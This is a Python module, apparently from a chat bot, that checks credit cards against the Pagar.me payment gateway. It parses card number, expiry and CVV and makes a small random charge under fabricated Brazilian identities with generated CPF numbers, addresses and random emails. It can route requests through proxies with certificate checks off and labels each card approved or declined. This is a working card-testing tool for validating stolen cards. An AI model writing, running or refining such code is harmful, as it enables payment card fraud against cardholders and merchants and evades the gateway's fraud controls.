import requests, re, random, time
from fordev import generators
from fordev.generators import people
#from bot.cogs.modules.functions import random_user_agent
import json, time

try:
    with open('config/config_checker.json', 'r', encoding='UTF-8') as file:
        pagarme_c = json.loads(file.read())['pagarme']
        api_key = pagarme_c['api_key']

except:
    api_key = ''


def code_description(code, language_type='pt'):
    if not language_type == 'pt':
        language_type = 'en'

    try:
        with open('assets/pagarme_return_codes.json', 'r', encoding='UTF-8') as file:
            codes = json.loads(file.read())
        description = codes[str(code)][language_type]
    except:
        if language_type == 'pt':
            description = 'Transação Negada'
        else:
            description = 'Transaction Not Approved'
    
    return description


def pagarme(full, key=api_key, proxy=''):
    if proxy == '':
        time.sleep(3)
    
    if len(full.split("|")) == 4:
        ccn, mes, ano, cvv = full.split("|")
        
        if "ek_live" in key:
            key_type = 'encryption_key'
        else:
            key_type = 'api_key'
        
        if len(ano) == 2:
            ano = '20'+ano
        
        url = "https://api.pagar.me/1/transactions"
        
        headers = {
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",

        }
        
        dados = people()
        
        with open('assets/db_emails.json', 'r') as file2:
            load = json.loads(file2.read())
            emails = load['emails']
            email = random.choice(emails)
        
        endereco = generators.people(
            uf_code=generators.uf()[0],
            data_only=True
        )
        
        debitar = str(random.randint(100, 200))
        preco = f'R${debitar[0]},{debitar[1]}{debitar[2]}'
        data = {
            key_type: key,
            "amount": debitar,
            "card_number": ccn,
            "card_cvv": cvv,
            "card_expiration_date": mes + ano[2:],
            "card_holder_name": dados["nome"].upper(),
            "customer": {
                "external_id": str(random.randint(111111,999999)),
                "name": dados["nome"].upper(),
                "type": "individual",
                "country": "br",
                "email": email,
                "documents": [
                    {
                        "type": "cpf",
                        "number": dados["cpf"]
                    }
                ],
                "phone_numbers": [
                    "+55" + re.sub(
                        "[^0-9]+", "", endereco["celular"]
                    )
                ],
                "birthday": "-".join(
                    reversed(
                        dados["data_nasc"].split("/")
                    )
                )
            },
            "billing": {
                "name": dados["nome"],
                "address": {
                    "country": "br",
                    "state": endereco["estado"],
                    "city": endereco["cidade"],
                    "neighborhood": endereco["bairro"],
                    "street": endereco["endereco"],
                    "street_number": str(endereco["numero"]),
                    "zipcode": endereco["cep"].replace("-", "")
                }
            },
            "shipping": {
                "fee": 000,
                "name": dados["nome"],
                "address": {
                    "country": "br",
                    "state": endereco["estado"],
                    "city": endereco["cidade"],
                    "neighborhood": endereco["bairro"],
                    "street": endereco["endereco"],
                    "street_number": str(endereco["numero"]),
                    "zipcode": endereco["cep"].replace("-", "")
                }
            },
            "items": [
                {
                    "id": "SF280",
                    "title": "Check-in Demo",
                    "unit_price": debitar,
                    "quantity": 1,
                    "tangible": True
                }
            ]
    
        }
        
        phone = str(re.sub("[^0-9]+", "", endereco["celular"]))
        ddd = phone[:2]
        phone_number = phone[2:]
        data2 = {
            key_type: key,
            "amount": debitar,
            "card_number": ccn,
            "card_cvv": cvv,
            "card_expiration_date": mes + ano[2:],
            "card_holder_name": dados["nome"].upper(),
            "customer": {
                "external_id": str(random.randint(111111,999999)),
                "name": dados["nome"].upper(),
                "type": "individual",
                "country": "br",
                "email": email,
                "document_number": dados["cpf"],
                "address": {
                    "country": "br",
                    "state": endereco["estado"],
                    "city": endereco["cidade"],
                    "neighborhood": endereco["bairro"],
                    "street": endereco["endereco"],
                    "street_number": str(endereco["numero"]),
                    "zipcode": endereco["cep"].replace("-", "")
                },
                "phone": {
                    "ddd": ddd,
                    "number": phone_number
                },
                "birthday": "-".join(
                    reversed(
                        dados["data_nasc"].split("/")
                    )
                )
            },
            "billing": {
                "name": dados["nome"],
                "address": {
                    "country": "br",
                    "state": endereco["estado"],
                    "city": endereco["cidade"],
                    "neighborhood": endereco["bairro"],
                    "street": endereco["endereco"],
                    "street_number": str(endereco["numero"]),
                    "zipcode": endereco["cep"].replace("-", "")
                }
            },
            "shipping": {
                "fee": 000,
                "name": dados["nome"],
                "address": {
                    "country": "br",
                    "state": endereco["estado"],
                    "city": endereco["cidade"],
                    "neighborhood": endereco["bairro"],
                    "street": endereco["endereco"],
                    "street_number": str(endereco["numero"]),
                    "zipcode": endereco["cep"].replace("-", "")
                }
            },
            "items": [
                {
                    "id": "SF280",
                    "title": "Check-in Demo",
                    "unit_price": debitar,
                    "quantity": 1,
                    "tangible": True
                }
            ]
    
        }

        try:
            if proxy == '':
                response = requests.post(url,headers=headers,json=data).json()
                
            else:
                try:
                    response = requests.post(url,headers=headers,json=data, proxies={'http': 'http://'+proxy, 'https': 'http://'+proxy}, verify=False).json()
                    
                except:
                    response = requests.post(url,headers=headers,json=data).json()
                    


            preco = str(debitar)
            preco = f'R${preco[0]},{preco[1]}{preco[2]}'
            
            if 'errors' not in response.keys():
                code = response["acquirer_response_code"]
                description = code_description(code)
                if "status" not in response.keys():
                    return False, 'Erro na comunicação com o Gateway'
        
                elif response["acquirer_response_code"] == "0000":
                
                    return True, f'#Aprovado - {description} - Code: {code} - {preco}'
                
                elif response["acquirer_response_code"] == 'None' or response["acquirer_response_code"] is None:
                    return False, f'Erro na transação, verifique o checker Pagar.me!'
            
                else:        
                    return False, f'#Reprovado - {description} - Code: {code} - {preco}'
            
            else:
                if proxy == '':
                    response = requests.post(url,headers=headers,json=data2).json()
                    
                else:
                    try:
                        response = requests.post(url,headers=headers,json=data2, proxies={'http': 'http://'+proxy, 'https': 'http://'+proxy}, verify=False).json()
                        
                    except:
                        response = requests.post(url,headers=headers,json=data2).json()
                        

                if "acquirer_response_code" in response.keys():
                    preco = str(debitar)
                    preco = f'R${preco[0]},{preco[1]}{preco[2]}'
                    code = response['acquirer_response_code']
                    description = code_description(code)
                        
                    if "status" not in response.keys():
                        return False, 'Erro na comunicação com o Gateway'
            
                    elif response["acquirer_response_code"] == "0000":
                    
                        return True, f'#Aprovado - {description} - Code: {code} - {preco}'
                
                    else:        
                        return False, f'#Reprovado - {description} - Code: {code} - {preco}'
                
                else:
                    if response['object'] == 'transaction':
                        preco = str(debitar)
                        preco = f'R${preco[0]},{preco[1]}{preco[2]}'
                        
                        status = response['status']

                        if status == 'authorized':
                            return True, f'#Aprovado - Transação autorizada - {preco}'
                        
                        else:
                            return False, f'#Reprovado - Transação negada - {preco}'
                    
                    else:
                        return False, 'Erro na transação, verifique o checker Pagar.me!'
            
            
        except Exception as e:
            print(e)
            return False, 'Request inválido ao Gateway'
        
    else:
        return False, 'Parâmetros insuficientes'

